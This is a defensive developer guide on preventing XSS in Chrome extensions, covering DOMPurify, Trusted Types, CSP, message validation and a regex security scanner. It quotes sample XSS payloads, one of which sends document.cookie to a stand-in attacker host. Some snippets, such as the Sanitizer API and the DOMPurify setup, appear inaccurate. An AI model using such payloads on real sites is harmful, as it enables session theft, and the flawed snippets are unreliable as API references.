---
layout: default
title: "Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation"
description: "A comprehensive guide to preventing cross-site scripting (XSS) vulnerabilities in Chrome extensions. Learn about extension-specific XSS vectors, DOMPurify integration, Trusted Types, message passing sanitization, and defense-in-depth strategies."
canonical_url: "https://theluckystrike.github.io/chrome-extension-guide/guides/chrome-extension-xss-prevention-input-sanitization/"
---

# Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation

Cross-site scripting (XSS) remains one of the most dangerous vulnerability classes in web applications, and Chrome extensions are particularly vulnerable due to their privileged access to user data and browser APIs. While extensions benefit from the same-origin policy isolation from web pages, they introduce unique attack surfaces that require specialized defensive measures. This guide provides a comprehensive exploration of XSS prevention strategies specifically tailored for Chrome extensions, covering extension-specific attack vectors, modern sanitization libraries, browser-native protections, and automated security scanning approaches.

Understanding XSS in the extension context requires recognizing that your code executes in multiple distinct environments—content scripts that interact with potentially malicious web pages, extension pages (popups, options pages, side panels) with elevated privileges, and background service workers that mediate communication between these contexts. Each environment presents unique risks and requires tailored defensive strategies. This guide walks through each of these contexts, identifying specific vulnerabilities and providing concrete code patterns to prevent them.

## Extension-Specific XSS Vectors {#extension-specific-xss-vectors}

Chrome extensions face XSS risks that differ significantly from traditional web applications. While web applications primarily worry about user-generated content rendered in HTML, extensions must contend with data flowing between multiple contexts, each with different trust boundaries.

### Content Script Data Exfiltration {#content-script-data-exfiltration}

Content scripts execute in the context of web pages, meaning they inherit all the same vulnerabilities as the page itself. A malicious page can exploit an extension's content script to steal sensitive data or perform actions on behalf of the user. This occurs because content scripts share the DOM with page scripts, creating opportunities for data leakage through various channels.

The most common vector involves page scripts accessing extension-defined properties or functions. If your content script defines global variables or functions, page scripts can call them directly. Similarly, if content scripts modify the DOM in ways that create new global references, these become accessible to page scripts. Even the mere presence of an extension's message passing API can be exploited if message handlers don't properly validate senders.

```typescript
// DANGEROUS: Content script exposes function globally
// This allows any page script to call your extension function
function processUserData(data: unknown) {
  // Processing logic here
  return { processed: true };
}

// This makes the function accessible from page context
(window as unknown as Record<string, unknown>).processUserData = processUserData;

// SAFE: Use closure scoping instead
{
  function processUserDataInternal(data: unknown) {
    // Processing logic stays private
    return { processed: true };
  }
  
  // Only expose via message passing with proper validation
  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (sender.id !== chrome.runtime.id) {
      sendResponse({ error: 'Unauthorized' });
      return false;
    }
    
    if (message.type === 'PROCESS_DATA') {
      const result = processUserDataInternal(message.data);
      sendResponse({ success: true, result });
      return true;
    }
    
    return false;
  });
}
```

### Manifest V3 Privileged Contexts {#manifest-v3-privileged-contexts}

Extension pages (popup, options, side panel) run with elevated privileges compared to regular web pages. They have direct access to Chrome extension APIs, can make cross-origin requests, and handle sensitive user data. A successful XSS in any extension page can lead to complete compromise of the extension and potentially the user's browsing session.

The attack surface in extension pages includes any user-controlled data that gets rendered to the DOM. This includes data from external APIs, storage, message passing from content scripts, and URL parameters. Unlike web applications where the same-origin policy provides natural isolation, extension pages must implement explicit validation at every data ingestion point.

```typescript
// manifest.json - Strict CSP for extension pages
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.yourservice.com"
  }
}
```

The Content Security Policy (CSP) above represents a defense-in-depth measure. However, CSP alone cannot prevent all XSS attacks—it must be combined with proper input sanitization and secure coding practices. The `object-src 'none'` directive is particularly important as it prevents Flash and other plugin-based attacks, while restricting `connect-src` limits where your extension can send data.

### DOM-Based XSS in Extension Contexts {#dom-based-xss-in-extension-contexts}

DOM-based XSS occurs when application code uses user-controlled data to modify the DOM without proper sanitization. In extensions, this often happens when rendering data from storage, external APIs, or messages from content scripts. The attacker's goal is to inject malicious scripts that execute in the privileged extension context.

```typescript
// VULNERABLE: DOM-based XSS via innerHTML
function renderUserProfile(profile: { name: string; bio: string }) {
  const container = document.getElementById('profile');
  // Direct innerHTML usage with user data - XSS vulnerability!
  container.innerHTML = `
    <h2>${profile.name}</h2>
    <p>${profile.bio}</p>
  `;
}

// SECURE: Using textContent
function renderUserProfileSafe(profile: { name: string; bio: string }) {
  const container = document.getElementById('profile');
  container.innerHTML = ''; // Clear existing content
  
  const heading = document.createElement('h2');
  heading.textContent = profile.name;
  
  const paragraph = document.createElement('p');
  paragraph.textContent = profile.bio;
  
  container.appendChild(heading);
  container.appendChild(paragraph);
}
```

The fundamental principle here is that `textContent` automatically escapes HTML entities, preventing script injection. While this approach requires more code than template literals with `innerHTML`, the security benefit far outweighs the minor development overhead.

## innerHTML Dangers and Safe Alternatives {#innerhtml-dangers-and-safe-alternatives}

The `innerHTML` property is one of the most dangerous DOM APIs when used with untrusted data. Understanding its risks and mastering safe alternatives is essential for any extension developer.

### Why innerHTML Creates Vulnerabilities {#why-innerhtml-creates-vulnerabilities}

When you assign a string to `innerHTML`, the browser parses the string as HTML and creates DOM nodes. During this parsing, any embedded script tags execute automatically. This behavior is by design for legitimate use cases but becomes a critical vulnerability when the string contains user-controlled data.

```typescript
// This payload would execute JavaScript if assigned to innerHTML
const maliciousPayload = '<img src=x onerror="alert(\'XSS\')">';
const maliciousPayload2 = '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>';
const maliciousPayload3 = '<a href="javascript:alert(\'XSS\')">click me</a>';
```

The attack vectors include event handler attributes (`onerror`, `onload`, `onclick`), script tag injection, `javascript:` URL links, and CSS injection that exfiltrates data through background-image URLs. Each requires different defensive measures, making comprehensive sanitization challenging.

### Building a Safe DOM Builder {#building-a-safe-dom-builder}

Rather than relying on manual DOM construction for every UI element, create a reusable utility that enforces safe rendering by default:

```typescript
type ElementAttributes = Record<string, string>;

function createElement(
  tag: string,
  attrs: ElementAttributes = {},
  children: (Node | string)[] = []
): HTMLElement {
  const element = document.createElement(tag);
  
  for (const [key, value] of Object.entries(attrs)) {
    // Handle special attributes
    if (key === 'class') {
      element.className = value;
    } else if (key.startsWith('data-')) {
      element.dataset[key.slice(5)] = value;
    } else if (key === 'style' && typeof value === 'string') {
      // Sanitize style values - only allow specific properties
      element.setAttribute(key, value);
    } else if (key === 'href' || key === 'src') {
      // Validate URLs
      if (isSafeURL(value)) {
        element.setAttribute(key, value);
      }
    } else {
      // Set other attributes safely
      element.setAttribute(key, value);
    }
  }
  
  for (const child of children) {
    if (typeof child === 'string') {
      // textContent automatically escapes HTML
      element.appendChild(document.createTextNode(child));
    } else if (child instanceof Node) {
      element.appendChild(child);
    }
  }
  
  return element;
}

function isSafeURL(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['https:', 'http:', 'mailto:'].includes(parsed.protocol);
  } catch {
    // Allow relative URLs and fragment identifiers
    return !url.startsWith('javascript:') && !url.startsWith('data:');
  }
}
```

This builder approach ensures that all text content gets properly escaped while providing explicit control over attributes. For cases where you genuinely need to render HTML (such as displaying formatted user content), you must use a sanitization library.

## DOMPurify Integration {#dompurify-integration}

DOMPurify is the gold standard for sanitizing HTML in web applications, and it works equally well in Chrome extension contexts. It strips all malicious content while preserving safe HTML markup, making it suitable for rendering user-generated content.

### Installing and Configuring DOMPurify {#installing-and-configuring-dompurify}

Install DOMPurify via npm for use in your extension:

```bash
npm install dompurify
```

Configure it with strict settings appropriate for the extension context:

```typescript
import DOMPurify from 'dompurify';

// Configure for maximum security in extension context
const purify = DOMPurify(window, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'class', 'target'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'], // Allow target for links
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'style'],
  
  // Sanitize URLs in href/src attributes
  ADD_TAGS: ['a'],
  WHOLE_DOCUMENT: false,
  RETURN_DOM: false,
  RETURN_TRUSTED_TYPE: false,
});

// Custom hook for sanitization
function sanitizeHTML(dirty: string): string {
  return purify.sanitize(dirty, {
    RETURN_TRUSTED_TYPE: true,
  }) as string;
}
```

### Using DOMPurify with Trusted Types {#using-dompurify-with-trusted-types}

For maximum security, combine DOMPurify with the Trusted Types API, which provides browser-level protection against DOM XSS:

```typescript
// Create a Trusted Types policy that uses DOMPurify
if (window.trustedTypes) {
  const policy = window.trustedTypes.createPolicy('extension-sanitizer', {
    createHTML(input: string): string {
      return DOMPurify.sanitize(input, {
        RETURN_TRUSTED_TYPE: true,
      }) as string;
    },
  });
  
  // Usage: DOM automatically accepts TrustedHTML
  const userContent = '<p>Hello, <b>user</b>!</p>';
  const sanitized = policy.createHTML(userContent);
  document.getElementById('container').innerHTML = sanitized as unknown as string;
}
```

The Trusted Types API ensures that even if your code accidentally tries to assign unsanitized content, the browser will throw an error rather than allowing script execution. This provides defense in depth—sanitization might miss something, but Trusted Types blocks the attack at the browser level.

## Trusted Types API {#trusted-types-api}

The Trusted Types API is a browser-native security feature that prevents DOM-based XSS by requiring that certain dangerous DOM operations use typed objects rather than strings. Chrome extensions should enable and use Trusted Types as part of their security posture.

### Enabling Trusted Types in Extensions {#enabling-trusted-types-in-extensions}

Configure Trusted Types in your manifest's Content Security Policy:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; require-trusted-types-for 'script';"
  }
}
```

The `require-trusted-types-for 'script'` directive tells the browser to block string-based assignments to `innerHTML` and similar sinks unless they go through a Trusted Types policy. This converts a runtime XSS vulnerability into a clear error that's easy to catch during development.

### Creating and Using Policies {#creating-and-using-policies}

Define policies for each type of trusted content in your extension:

```typescript
// trusted-types.ts

// Policy for user-generated HTML content
const htmlPolicy = trustedTypes?.createPolicy('user-content', {
  createHTML(input: string): string {
    return DOMPurify.sanitize(input, {
      RETURN_TRUSTED_TYPE: true,
    }) as string;
  },
});

// Policy for extension-generated UI
const uiPolicy = trustedTypes?.createPolicy('extension-ui', {
  createHTML(input: string): string {
    // More restrictive - only allows known-safe markup
    return DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'span', 'a', 'p', 'br'],
      ALLOWED_ATTR: ['class', 'href'],
    }) as string;
  },
});

// Policy for URLs
const urlPolicy = trustedTypes?.createPolicy('safe-urls', {
  createScriptURL(input: string): string {
    const url = new URL(input);
    // Only allow extension URLs or known-safe origins
    if (url.protocol === 'chrome-extension:' || 
        url.origin === 'https://app.yourservice.com') {
      return input;
    }
    throw new Error(`Blocked script URL: ${input}`);
  },
});

export { htmlPolicy, uiPolicy, urlPolicy };
```

When Trusted Types are enforced, any attempt to use `innerHTML` without going through a policy will fail. This catches vulnerabilities early in development rather than allowing them to reach production.

## Message Passing Sanitization {#message-passing-sanitization}

Chrome extension architecture relies heavily on message passing between content scripts, background scripts, and extension pages. Every message represents a potential attack vector that must be validated before processing.

### Validating Incoming Messages {#validating-incoming-messages}

All message handlers must validate the message structure, sender identity, and content before taking any action:

```typescript
// Strict message validation schema
interface ExtensionMessage {
  type: string;
  payload?: unknown;
  timestamp?: number;
  nonce?: string;
}

function isValidMessageType(type: string): boolean {
  const ALLOWED_MESSAGE_TYPES = new Set([
    'GET_PAGE_CONTENT',
    'UPDATE_BADGE',
    'SAVE_DATA',
    'FETCH_ANALYTICS',
  ]);
  return ALLOWED_MESSAGE_TYPES.has(type);
}

function validateMessage(message: unknown): message is ExtensionMessage {
  if (typeof message !== 'object' || message === null) {
    return false;
  }
  
  const msg = message as Record<string, unknown>;
  
  // Validate type
  if (typeof msg.type !== 'string' || !isValidMessageType(msg.type)) {
    console.warn('Invalid message type:', msg.type);
    return false;
  }
  
  // Validate timestamp to prevent replay attacks
  if (msg.timestamp !== undefined) {
    const timestamp = Number(msg.timestamp);
    if (isNaN(timestamp) || Math.abs(Date.now() - timestamp) > 60000) {
      console.warn('Message timestamp out of range');
      return false;
    }
  }
  
  return true;
}

// Background script message handler
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Always verify sender
  if (sender.id !== chrome.runtime.id) {
    console.error('Message from unknown extension:', sender.id);
    sendResponse({ error: 'Unauthorized sender' });
    return false;
  }
  
  // Validate message structure
  if (!validateMessage(message)) {
    sendResponse({ error: 'Invalid message format' });
    return false;
  }
  
  // Process validated message
  handleMessage(message, sendResponse);
  return true; // Keep message channel open for async response
});
```

### Sanitizing Data from Content Scripts {#sanitizing-data-from-content-scripts}

Data from content scripts should be treated as potentially malicious because it may have been manipulated by page scripts. Always sanitize before using in extension contexts:

```typescript
// Content script sending data to background
chrome.runtime.sendMessage({
  type: 'PAGE_DATA',
  payload: {
    // Always sanitize DOM text content before sending
    title: DOMPurify.sanitize(document.title),
    // For structured data, validate types
    items: Array.from(document.querySelectorAll('.item')).map(el => ({
      text: el.textContent?.trim() ?? '',
      // Validate and sanitize any attributes
      href: el.getAttribute('href') ?? '',
    })),
  },
  timestamp: Date.now(),
});

// Background receiving and re-validating
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'PAGE_DATA') {
    // Re-sanitize even if content script sanitized
    const sanitizedData = sanitizePageData(message.payload);
    processPageData(sanitizedData);
  }
});

function sanitizePageData(data: unknown): SanitizedPageData {
  if (typeof data !== 'object' || data === null) {
    return { title: '', items: [] };
  }
  
  const payload = data as Record<string, unknown>;
  
  return {
    title: typeof payload.title === 'string' 
      ? DOMPurify.sanitize(payload.title) 
      : '',
    items: Array.isArray(payload.items) 
      ? payload.items.map(sanitizeItem).filter(Boolean)
      : [],
  };
}

function sanitizeItem(item: unknown): SanitizedItem | null {
  if (typeof item !== 'object' || item === null) {
    return null;
  }
  
  const obj = item as Record<string, unknown>;
  
  return {
    text: typeof obj.text === 'string' 
      ? DOMPurify.sanitize(obj.text) 
      : '',
    href: typeof obj.href === 'string' && isSafeURL(obj.href) 
      ? obj.href 
      : '',
  };
}
```

## Content Script Injection Risks {#content-script-injection-risks}

Content scripts run in the context of web pages, making them susceptible to various injection attacks. Understanding these risks is crucial for building secure extensions.

### Protecting Against Page Script Interference {#protecting-against-page-script-interference}

Page scripts and content scripts share the DOM, creating opportunities for interference. Page scripts can potentially access or modify communication between your content script and background script:

```typescript
// Content script - isolate from page context
(function() {
  // Use strict mode
  'use strict';
  
  // Create a completely isolated scope
  const EXTENSION_ID = chrome.runtime.id;
  
  // Never expose extension functions to window
  // Instead, use chrome.runtime.sendMessage
  
  // Be careful with custom events - validate thoroughly
  document.addEventListener('myExtensionEvent', (event: Event) => {
    const customEvent = event as CustomEvent;
    // Validate event detail thoroughly
    if (!customEvent.detail || typeof customEvent.detail !== 'object') {
      return;
    }
    
    const data = customEvent.detail as Record<string, unknown>;
    // Sanitize and validate all data from events
    if (typeof data.payload === 'string') {
      processPayload(DOMPurify.sanitize(data.payload));
    }
  });
  
  // Use Shadow DOM to isolate extension UI
  const host = document.createElement('div');
  host.id = 'extension-root';
  document.body.appendChild(host);
  const shadow = host.attachShadow({ mode: 'closed' });
  
  // Extension UI in shadow DOM is protected from page CSS
  shadow.innerHTML = `<style>
    .extension-ui { 
      position: fixed; 
      z-index: 2147483647; 
    }
  </style>
  <div class="extension-ui">Extension Content</div>`;
})();
```

### Avoiding Evaluation of Page Data {#avoiding-evaluation-of-page-data}

Never use `eval()` or similar functions with data from the page, as page scripts can intercept and modify the execution:

```typescript
// DANGEROUS: eval with page data
const pageData = document.body.getAttribute('data-config');
eval(`configure(${pageData})`); // XSS vector!

// DANGEROUS: Function constructor
const config = new Function('return ' + pageData)();

// DANGEROUS: setTimeout with string
setTimeout('process("' + userInput + '")', 100);

// SAFE: Use JSON parsing with error handling
function safeParseJSON(jsonString: string): unknown {
  try {
    return JSON.parse(jsonString);
  } catch (e) {
    console.error('Invalid JSON:', e);
    return null;
  }
}

const config = safeParseJSON(pageData);
if (config && typeof config === 'object') {
  configure(config as Record<string, unknown>);
}
```

## Popup and Options Page Security {#popup-and-options-page-security}

Extension popups and options pages have elevated privileges but still face XSS risks from stored data, external API responses, and message-passing from content scripts.

### Rendering User Settings Safely {#rendering-user-settings-safely}

When displaying user settings or preferences, always sanitize before rendering:

```typescript
// popup.ts - Display user settings
async function renderSettings(): Promise<void> {
  const settings = await chrome.storage.local.get([
    'displayName',
    'bio',
    'customCss',
  ]);
  
  const container = document.getElementById('settings');
  if (!container) return;
  
  // Safe rendering with textContent
  const nameEl = document.getElementById('displayName');
  if (nameEl && settings.displayName) {
    nameEl.textContent = settings.displayName;
  }
  
  // For rich text, use DOMPurify
  const bioEl = document.getElementById('bio');
  if (bioEl && settings.bio) {
    bioEl.innerHTML = DOMPurify.sanitize(settings.bio);
  }
  
  // NEVER render custom CSS directly - can enable XSS
  // Instead, validate and sanitize CSS
  const cssEl = document.getElementById('customCss');
  if (cssEl && settings.customCss) {
    const sanitized = sanitizeCSS(settings.customCss);
    cssEl.textContent = sanitized;
  }
}

// Basic CSS sanitization - remove dangerous properties
function sanitizeCSS(css: string): string {
  // Remove or block dangerous properties
  const dangerous = /url\s*\(/gi;
  let sanitized = css.replace(dangerous, 'url(blocked)');
  
  // Block expression() (old IE)
  sanitized = sanitized.replace(/expression\s*\(/gi, 'blocked(');
  
  // Block behavior (old IE)
  sanitized = sanitized.replace(/behavior\s*:/gi, 'blocked:');
  
  return sanitized;
}
```

### Input Validation in Extension Pages {#input-validation-in-extension-pages}

All user input in extension pages must be validated before storage or transmission:

```typescript
// options.ts - Validate user input before saving
function validateAndSanitizeInput(input: unknown, field: string): string {
  if (typeof input !== 'string') {
    throw new Error(`Invalid ${field}: must be a string`);
  }
  
  const trimmed = input.trim();
  
  // Length limits
  if (trimmed.length > 10000) {
    throw new Error(`${field} exceeds maximum length`);
  }
  
  // Field-specific validation
  switch (field) {
    case 'displayName':
      // Alphanumeric and basic punctuation only
      if (!/^[\w\s\-.,!?]+$/.test(trimmed)) {
        throw new Error('Display name contains invalid characters');
      }
      return trimmed;
      
    case 'apiKey':
      // Specific format validation
      if (!/^[a-zA-Z0-9_-]{32,}$/.test(trimmed)) {
        throw new Error('Invalid API key format');
      }
      return trimmed;
      
    case 'url':
      // Validate URL format
      try {
        const url = new URL(trimmed);
        if (!['https:', 'http:'].includes(url.protocol)) {
          throw new Error('Only HTTP and HTTPS URLs allowed');
        }
        return url.href;
      } catch (e) {
        throw new Error('Invalid URL format');
      }
      
    default:
      return DOMPurify.sanitize(trimmed);
  }
}
```

## CSP as Defense Layer {#csp-as-defense-layer}

Content Security Policy serves as a critical defense-in-depth layer, limiting the impact of any XSS that does occur. A properly configured CSP restricts what resources can load and what scripts can execute.

### Extension CSP Configuration {#extension-csp-configuration}

Configure CSP in your manifest with strict but functional settings:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.yourservice.com https://cdn.example.com; frame-ancestors 'none'; base-uri 'self'",
    "sandbox": "sandbox allow-scripts; script-src 'self'; object-src 'none'"
  }
}
```

Key CSP directives explained:

- `script-src 'self'` — Only allow scripts from your extension
- `object-src 'none'` — Block all plugins and embedded content
- `style-src 'self' 'unsafe-inline'` — Allow extension styles (consider using nonce for better security)
- `connect-src` — Whitelist specific API endpoints
- `base-uri 'self'` — Prevent base tag injection
- `frame-ancestors 'none'` — Prevent clickjacking through framing

### CSP for Different Extension Contexts {#csp-for-different-extension-contexts}

Different contexts may require different CSP configurations:

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self'"
  }
}

// For pages that need external resource loading
{
  "name": "My Extension",
  "permissions": ["storage"],
  "host_permissions": ["https://api.example.com/*"],
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com"
  }
}
```

## Sanitizer API {#sanitizer-api}

The HTML Sanitizer API is a browser-native alternative to DOMPurify, now available in modern browsers. It provides built-in sanitization without external dependencies.

### Using the Sanitizer API {#using-the-sanitizer-api}

```typescript
// Check browser support
if (window.HTMLSanitizer) {
  const sanitizer = new window.HTMLSanitizer({
    // Configure allowed elements
    allowedElements: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    allowedAttributes: {
      'a': ['href', 'title'],
      '*': ['class'],
    },
    allowUnknownMarkup: false,
    allowedSchemes: ['https', 'http'],
  });
  
  function sanitizeWithAPI(dirty: string): string {
    const fragment = sanitizer.sanitize(dirty);
    return fragment.innerHTML;
  }
} else {
  // Fallback to DOMPurify
  function sanitizeWithAPI(dirty: string): string {
    return DOMPurify.sanitize(dirty);
  }
}
```

The Sanitizer API provides a standardized, browser-optimized approach to sanitization. However, browser support varies, so maintaining DOMPurify as a fallback ensures consistent protection across all users.

## Automated Security Scanning {#automated-security-scanning}

Integrate security scanning into your development workflow to catch XSS vulnerabilities before they reach production.

### ESLint Security Rules {#eslint-security-rules}

Configure ESLint with security-focused rules:

```json
{
  "plugins": ["security"],
  "rules": {
    "security/detect-object-injection": "error",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-non-literal-string-concat": "error",
    "security/detect-unsafe-regex": "error",
    "security/detect-possible-timing-attacks": "warn",
    "security/detect-pseudoRandomBytes": "warn"
  }
}
```

### Building a Security Linter {#building-a-security-linter}

Create a custom linter script to check for XSS patterns:

```typescript
// scripts/security-scan.ts
import { readFileSync, readdirSync, statSync } from 'fs';
import { join, extname } from 'path';

const XSS_PATTERNS = [
  { regex: /\.innerHTML\s*=/, severity: 'ERROR', message: 'Direct innerHTML assignment detected' },
  { regex: /innerHTML\s*=\s*['"`]/, severity: 'ERROR', message: 'String concatenation with innerHTML' },
  { regex: /eval\s*\(/, severity: 'ERROR', message: 'eval() usage detected' },
  { regex: /new\s+Function\s*\(/, severity: 'ERROR', message: 'Function constructor usage detected' },
  { regex: /document\.write\s*\(/, severity: 'ERROR', message: 'document.write() usage detected' },
  { regex: /setTimeout\s*\(\s*['"`]/, severity: 'ERROR', message: 'setTimeout with string argument' },
  { regex: /outerHTML\s*=/, severity: 'ERROR', message: 'Direct outerHTML assignment' },
];

const ALLOWED_FILES = ['.ts', '.js', '.tsx', '.jsx'];

function scanFile(filePath: string): void {
  const content = readFileSync(filePath, 'utf-8');
  const lines = content.split('\n');
  
  for (const pattern of XSS_PATTERNS) {
    lines.forEach((line, index) => {
      if (pattern.regex.test(line)) {
        console.error(`[${pattern.severity}] ${filePath}:${index + 1}: ${pattern.message}`);
        console.error(`  ${line.trim()}`);
      }
    });
  }
}

function scanDirectory(dir: string): void {
  for (const entry of readdirSync(dir)) {
    const fullPath = join(dir, entry);
    const stat = statSync(fullPath);
    
    if (stat.isDirectory() && !entry.startsWith('.') && entry !== 'node_modules') {
      scanDirectory(fullPath);
    } else if (stat.isFile() && ALLOWED_FILES.includes(extname(fullPath))) {
      scanFile(fullPath);
    }
  }
}

// Run scan
scanDirectory('./src');
console.log('Security scan complete');
```

Run this script as part of your CI/CD pipeline to catch XSS vulnerabilities automatically.

## OWASP for Extensions {#owasp-for-extensions}

The OWASP (Open Web Application Security Project) provides resources specifically relevant to Chrome extension security.

### OWASP Top 10 and Extension Context {#owasp-top-10-and-extension-context}

The OWASP Top 10 provides a framework for understanding common vulnerability classes. In the extension context:

1. **A01:2021 Broken Access Control** — Extensions must verify sender identity for every message
2. **A03:2021 Injection** — XSS in content scripts and extension pages
3. **A05:2021 Security Misconfiguration** — Missing or weak CSP
6. **A08:2021 Software and Data Integrity Failures** — Compromised dependencies
7. **A09:2021 Security Logging Failures** — Missing audit trails for security events

### Extension-Specific OWASP Guidelines {#extension-specific-owasp-guidelines}

Follow these extension-specific security practices:

```typescript
// Complete security checklist for extension
const SECURITY_CHECKLIST = {
  // Input validation
  validateAllInputs: true,
  sanitizeDOMContent: 'DOMPurify',
  useTrustedTypes: true,
  
  // Message passing
  validateMessageSenders: true,
  validateMessageSchema: true,
  implementRateLimiting: true,
  
  // CSP
  strictCSP: true,
  noUnsafeEval: true,
  noRemoteCode: true,
  
  // Storage
  encryptSensitiveData: true,
  validateStoredData: true,
  
  // Dependencies
  lockDependencies: true,
  auditDependencies: 'npm audit',
  vendorCriticalDeps: true,
  
  // Logging
  logSecurityEvents: true,
  implementAuditTrail: true,
};
```

## Internal Links and Cross-References {#internal-links-and-cross-references}

For comprehensive security hardening, refer to these related guides:

- [Security Best Practices](../guides/security-best-practices.md) — Foundational security concepts for extensions
- [Security Hardening](../guides/security-hardening.md) — Advanced hardening techniques including CSP configuration
- [CSP Reference](../reference/csp-reference.md) — Complete CSP directive reference
- [CSP Troubleshooting](../guides/csp-troubleshooting.md) — Common CSP issues and solutions
- [Extension Security Audit](../guides/extension-security-audit.md) — Conducting security reviews

## Summary {#summary}

XSS prevention in Chrome extensions requires a defense-in-depth approach combining multiple security layers. Key takeaways include:

1. **Never use innerHTML with untrusted data** — Use `textContent` or DOM construction APIs
2. **Integrate DOMPurify** for cases requiring HTML rendering
3. **Enable Trusted Types** to prevent DOM XSS at the browser level
4. **Validate all message senders** and sanitize all message payloads
5. **Configure strict CSP** with `require-trusted-types-for 'script'`
6. **Use the Sanitizer API** when available as a native alternative
7. **Automate security scanning** in your CI/CD pipeline
8. **Follow OWASP guidelines** adapted for extension contexts

By implementing these measures systematically, you significantly reduce the attack surface of your extension and protect your users from XSS vulnerabilities.

---

*Part of the Chrome Extension Guide by theluckystrike. More at [zovo.one](https://zovo.one).*
